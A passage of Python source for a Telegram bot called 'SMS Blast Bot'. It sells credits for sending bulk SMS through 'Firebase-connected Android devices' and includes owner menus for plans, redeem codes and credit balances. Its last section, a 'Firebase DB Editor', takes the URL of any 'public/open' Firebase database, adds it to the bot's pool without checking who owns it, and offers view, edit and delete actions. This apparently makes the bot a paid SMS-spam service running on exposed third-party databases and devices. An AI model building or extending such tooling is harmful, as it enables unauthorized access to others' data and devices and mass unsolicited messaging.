        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💳')} <b>Add Pricing Plan</b>\n\n{sc('step 1/4')}: Plan ka naam bhejo:\n<i>Example: Basic Plan</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_name, F.text)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 2/4')}</b>\n\nPrice bhejo:\n<i>Example: 50</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_price, F.text)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        price = float(msg.text.strip())
        await state.update_data(plan_price=price)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid price bhejo (numbers only).", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_credits)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 3/4')}</b>\n\nKitne credits dena hai?\n<i>Example: 100</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_credits, F.text)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        await state.update_data(plan_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💳')} <b>{sc('step 4/4')}</b>\n\nPayment redirect link bhejo:\n"
        f"<i>Example: {SUPER_ADMIN_LINK} ya koi payment URL</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_plan_link, F.text)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid URL bhejo (https:// se start hona chahiye).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    plan = {
        "id": str(int(time.time())),
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "credits": fsmd.get("plan_credits", 0),
        "currency": "INR",
        "payment_link": link
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Plan Added!</b>\n\n{em(EMOJI_STAR, '📋')} {plan['name']}\n{em(EMOJI_MONEY, '💰')} {plan['price']} INR = {plan['credits']} credits\n{em(EMOJI_GEAR, '🔗')} {plan['payment_link']}",
        reply_markup=kb([(f"{sc('back')}", "owner:pricing:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await safe_answer(cq, "❌ Koi plan nahi hai!", show_alert=True)
        return

    rows = []
    for plan in plans:
        rows.append([btn(f"{plan['name'][:25]}", f"owner:pricing:del:{plan['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Plan</b>\n\nKaunsa plan hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != plan_id]
    save(d)
    await safe_answer(cq, "🗑 Plan removed!")
    await owner_pricing_menu(cq, state)

@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})

    text = f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, data in list(codes.items())[:10]:
        status = f"{em(EMOJI_CHECK, '✅')} Active" if data.get("uses_left", 0) > 0 else f"{em(EMOJI_CROSS, '❌')} Expired"
        text += f"<code>{code}</code> — {em(EMOJI_MONEY, '💰')}{data['credits']} — {status} ({data.get('uses_left', 0)} left)\n"

    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕")],
        [btn("ᴅᴇʟᴇᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Generate Redeem Code</b>\n\n{sc('step 1/2')}: Kitne credits dena hai?\n<i>Example: 50</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_credits, F.text)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        await state.update_data(gen_credits=credits)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎁')} <b>{sc('step 2/2')}</b>\n\nKitni baar use ho sakta hai?\n<i>Example: 10</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(S.gen_redeem_uses, F.text)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        uses = int(msg.text.strip())
        if uses < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo (1 ya zyada).", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)

    while True:
        code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in d.get("redeem_codes", {}):
            break

    d.setdefault("redeem_codes", {})[code] = {
        "credits": credits,
        "uses_left": uses,
        "created_by": msg.from_user.id,
        "created_at": int(time.time()),
        "used_by": []
    }
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Code Generated!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} Max Uses: <b>{uses}</b>\n\n"
        f"<i>Users is code se redeem karke credits le sakte hain.</i>",
        reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    if not codes:
        await safe_answer(cq, "❌ Koi code nahi hai!", show_alert=True)
        return

    rows = []
    for code in list(codes.keys())[:20]:
        rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Delete Redeem Code</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        save(d)
    await safe_answer(cq, "🗑 Code deleted!")
    await owner_redeem_menu(cq, state)

@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_uid, F.text)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(credit_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.add_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits add karne hain?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_amount, F.text)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")
    add_credits(uid, amount, d, is_manual=True)
    save(d)
    await state.clear()

    try:
        await msg.bot.send_message(
            uid,
            f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n+{amount} credits mile hain!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
            parse_mode="HTML"
        )
    except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> added to <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_uid, F.text)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(deduct_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits deduct karne hain?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_amount, F.text)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    success = deduct_credits(uid, amount, d)
    save(d)
    await state.clear()

    if success:
        try:
            await msg.bot.send_message(
                uid,
                f"{em(EMOJI_WARNING, '⚠️')} <b>Credits Deducted!</b>\n\n-{amount} credits kat gaye.\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
                parse_mode="HTML"
            )
        except: pass
        await msg.answer(
            f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> deducted from <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
    else:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Insufficient credits! User ke paas sirf <b>{get_user_credits(uid, d)}</b> credits hain.",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )

@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    settings = d.get("settings", {})

    text = (
        f"{em(EMOJI_GEAR, '⚙️')} <b>Bot Settings</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Referral Credits: <b>{settings.get('ref_credits', 3)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Max Owners: <b>{settings.get('max_owners', 6)}</b>\n\n"
        f"<i>Settings change karne ke liye niche se select karein.</i>"
    )
    rows = [
        [btn("sᴇᴛ ʀᴇғᴇʀʀᴀʟ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Set Referral Credits</b>\n\nReferral pe kitne credits dena hai?\n<i>Example: 5</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.message(S.set_ref_credits, F.text)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        if credits < 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    d.setdefault("settings", {})["ref_credits"] = credits
    d["premium"]["ref_credits"] = credits
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Referral Credits Updated!</b>\n\nAb har referral pe <b>{credits}</b> credits milenge.",
        reply_markup=kb([(f"{sc('back')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return

    log_entries = d.get("activity_log", [])[-20:]
    if not log_entries:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Activity Log</b>\n\n<i>Koi activity nahi hai abhi tak.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent Activity Log</b>\n"]
        for entry in reversed(log_entries):
            ts = fmt_time(entry.get("timestamp", 0))
            action = entry.get("action", "unknown")
            uid = entry.get("uid", 0)
            details = entry.get("details", "")
            lines.append(f"[{ts}] <code>{uid}</code> — <b>{action}</b> — {details}")
        text = "\n".join(lines)

    await cq.message.edit_text(
        text,
        reply_markup=kb([
            (f"{sc('refresh')}", "owner:activity"),
            (f"{sc('back')}", "owner:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return

    all_history = d.get("sms_history", {})
    total_entries = sum(len(v) for v in all_history.values())

    text = f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\nTotal Records: <b>{total_entries}</b>\n\n"
    text += "<i>Per-user history unke Stats mein available hai.</i>"

    await cq.message.edit_text(
        text,
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if not can_use(uid, d):
        await cq.message.edit_text(f"{em(EMOJI_CROSS, '⛔')} Access nahi hai!", parse_mode="HTML")
        return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    credits = get_user_credits(uid, d)
    await safe_answer(cq, f"💰 Credits: {credits}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code</b>\n\nApna redeem code enter karein:\n<i>Example: GIFTABC123</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.redeem_code, F.text)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()

    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid redeem code!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    code_data = codes[code]
    if code_data.get("uses_left", 0) <= 0:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Ye code expire ho gaya hai!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    if uid in code_data.get("used_by", []):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Aap pehle se ye code use kar chuke hain!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    credits = code_data["credits"]
    add_credits(uid, credits, d, is_manual=False)
    code_data["uses_left"] = code_data.get("uses_left", 1) - 1
    code_data.setdefault("used_by", []).append(uid)
    save(d)

    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Successful!</b>\n\n{em(EMOJI_MONEY, '💰')} +{credits} credits added!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 3)

    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '👥')} <b>Referral Program</b>\n\n"
        f"Apna referral code share karein aur har successful referral pe <b>{ref_credits}</b> credits paayein!\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Your Code: <code>{code}</code>\n\n"
        f"{em(EMOJI_GEAR, '🔗')} Share Link:\n"
        f"https://t.me/{me.username}?start={code}",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    stats = d.get("stats", {})

    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{udata.get('credits', 0)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} SMS Sent: <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_GEAR, '📅')} Joined: <b>{fmt_time(udata.get('joined_at', 0))}</b>\n\n"
        f"{em(EMOJI_STAR, '📈')} Bot Total Sent: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    history = d.get("sms_history", {}).get(str(uid), [])[-10:]

    if not history:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b>\n\n<i>Abhi tak koi SMS send nahi kiya.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b> (Last 10)\n"]
        for i, entry in enumerate(reversed(history), 1):
            ts = fmt_time(entry.get("timestamp", 0))
            num = entry.get("number", "Unknown")
            msg_preview = entry.get("message", "")[:30]
            status = entry.get("status", "unknown")
            status_icon = em(EMOJI_CHECK, "✅") if status == "sent" else em(EMOJI_CROSS, "🛑") if status == "stopped" else em(EMOJI_WARNING, "⏳")
            lines.append(f"{i}. [{ts}] {status_icon} <code>{mask_number(num)}</code> — {msg_preview}...")
        text = "\n".join(lines)

    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])

    if not plans:
        await safe_answer(cq, "❌ Abhi koi plan available nahi!", show_alert=True)
        return

    text = f"{em(EMOJI_MONEY, '💰')} <b>Buy Credits</b>\n\n"
    for plan in plans:
        text += f"{em(EMOJI_STAR, '📋')} <b>{plan['name']}</b>\n"
        text += f"   {em(EMOJI_MONEY, '💰')} Price: <b>{plan['price']} {plan.get('currency', 'INR')}</b>\n"
        text += f"   {em(EMOJI_GIFT, '🎁')} Credits: <b>{plan['credits']}</b>\n\n"

    rows = []
    for plan in plans:
        rows.append([btn_url(f"Buy {sc(plan['name'][:20])}", plan['payment_link'], EMOJI_MONEY, "💳")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\n"
        f"{em(EMOJI_GEAR, '🤖')} Bot for sending bulk SMS via Firebase-connected Android devices.\n\n"
        f"{em(EMOJI_CROWN, '👤')} Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
        f"{em(EMOJI_BELL, '💬')} Support: Contact owner ({SUPER_ADMIN_NAME}) for any issues.\n\n"
        f"<i>Bot use karne ke liye credits chahiye. Referral se free credits paayein!</i>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await safe_answer(cq)


@R.callback_query(F.data == "owner:export_db")
async def owner_export_db(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    if not is_owner(uid, load()):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    if not os.path.exists(_DATA_FILE):
        await safe_answer(cq, "❌ Database file abhi nahi bana!", show_alert=True)
        return
    d = load()
    ts = now_ist().strftime("%Y%m%d_%H%M%S")
    raw_size = os.path.getsize(_DATA_FILE)
    if raw_size > 20 * 1024 * 1024:
        # raw 20MB se bada hai toh import mein wapas aane ke liye .gz zaroori hai
        gz_path = f"blast_data_{ts}.json.gz"
        with open(_DATA_FILE, "rb") as f_in, gzip.open(gz_path, "wb") as f_out:
            shutil.copyfileobj(f_in, f_out)
        gz_size = os.path.getsize(gz_path)
        doc = FSInputFile(gz_path)
        size_line = f"🗜 <b>Size:</b> {_human_size(raw_size)} → <b>{_human_size(gz_size)}</b> (compressed .gz)"
        note = "<i>Ye .gz file 'Import DB' se wapas import kar sakte ho.</i>"
        remove_after = gz_path
    else:
        doc = FSInputFile(_DATA_FILE)
        size_line = f"💾 <b>Size:</b> {_human_size(raw_size)}"
        note = "<i>Isi file ko 'Import DB' se wapas import kar sakte ho.</i>"
        remove_after = None
    await cq.message.answer_document(
        document=doc,
        caption=(
            "📦 <b>Database Export</b>\n\n"
            f"👥 Users: {len(d.get('users', {}))} | 🔥 Firebase DBs: {len(d.get('firebases', []))}\n"
            f"📅 {ts}\n{size_line}\n\n{note}"
        ),
        parse_mode="HTML"
    )
    if remove_after and os.path.exists(remove_after):
        try:
            os.remove(remove_after)
        except Exception:
            pass
    await safe_answer(cq, "✅ DB export bhej diya!")


# =====================================================================
# 🔥 FIREBASE DB EDITOR (Owner) — URL se direct import + view + edit + delete
# =====================================================================

@R.callback_query(F.data == "owner:db_editor")
async def owner_db_editor_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await safe_answer(cq, "🔥")
    await state.clear()
    await state.set_state(S.fb_editor_url)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase DB Editor</b>\n\n"
        f"Firebase DB ka URL bhejo (public/open DB):\n"
        f"<code>https://xxx-default-rtdb.firebaseio.com</code>\n\n"
        f"Bot use <b>direct import</b> karega aur view/edit/delete ka menu dega.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )


async def _fb_editor_process_url(msg: Message, state: FSMContext, raw_url: str) -> bool:
    """URL validate + direct import + menu. Returns True if menu dikhaya."""
    url = raw_url.strip()
    if not _fb_base_ok(url):
        await msg.answer("❌ Sirf Firebase DB URL allowed (https + firebaseio.com / firebasedatabase.app). Dobara bhejo:", parse_mode="HTML")
        return False
    base = url.rstrip("/")
    status, _ = await fb_http(base, "")
    if status != 200:
        await msg.answer(f"❌ DB access nahi hua (HTTP {status}). URL/permissions check karo.", parse_mode="HTML")
        return False

    # DIRECT IMPORT: naya URL toh bot ke firebases mein add
    d = load()
    existing = {fb.get("url", "").rstrip("/") for fb in d.get("firebases", [])}
    imported = False
    if base not in existing:
        host = base.split("//", 1)[-1].split(".")[0]
        d["firebases"].append({"id": f"fed{int(time.time() * 1000)}", "url": base, "label": host[:24]})
        save(d)
        imported = True

    ok, overview, keys = await _fb_overview(base)
    if not ok:
        await msg.answer(f"❌ {overview}", parse_mode="HTML")
        return False

    imp_line = f"\n\n{em(EMOJI_CHECK, '📥')} <b>Direct import ho gaya</b> — ab ye DB bot ke firebases mein hai" if imported else ""
    await state.update_data(editor_url=base)
    await state.set_state(S.fb_editor_menu)
    await msg.answer(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase DB Editor</b>\n<code>{base}</code>\n\n{overview}{imp_line}\n\n"
